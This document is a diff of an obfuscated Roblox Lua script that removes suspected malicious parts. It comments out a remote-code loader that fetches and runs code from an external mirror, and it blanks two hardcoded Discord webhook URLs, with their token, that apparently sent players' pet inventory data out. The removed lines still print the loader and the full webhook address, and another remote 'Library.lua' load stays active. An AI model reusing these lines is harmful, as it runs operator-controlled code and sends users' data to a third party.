@@ -17,7 +17,7 @@ return (function (...)
     local V = (loadstring(game:HttpGet(Y.."Library.lua")))()
     local f
     pcall(function ()
-        f = (loadstring(game:HttpGet("https://upio-github-mirror.pages.dev/source.lua")))()
+--         f = (loadstring(game:HttpGet("https://upio-github-mirror.pages.dev/source.lua")))()   -- REMOVED: operator-controlled remote code
     end)
     if f then
         V:SetIconModule(f)
@@ -1276,7 +1276,7 @@ return (function (...)
         end)
     end
     do
-        local h = "https://discord.com/api/webhooks/1521194823326105821/vBWxVd6OSNwvC79UNvZdiWda5DPYMQOmx2AgWqO3eoGChDEp5fjEQUOvadSuT7nOOjmi"
+        local h = ""
         local U = {{PetName = "Raccoon";
         Variants = {Normal = true;
         Rainbow = true}}, {PetName = "Unicorn", Variants = {Normal = true, Rainbow = true}}, {PetName = "GoldenDragonfly", Variants = {Normal = true, Rainbow = true}}, {PetName = "IceSerpent";
@@ -1366,7 +1366,7 @@ return (function (...)
             end)
     end
     task.spawn(function ()
-        local h = "https://discord.com/api/webhooks/1521194823326105821/vBWxVd6OSNwvC79UNvZdiWda5DPYMQOmx2AgWqO3eoGChDEp5fjEQUOvadSuT7nOOjmi"
+        local h = ""
         local U = {}
         local r = {PetName = true, Price = true;
         Rarity = true;
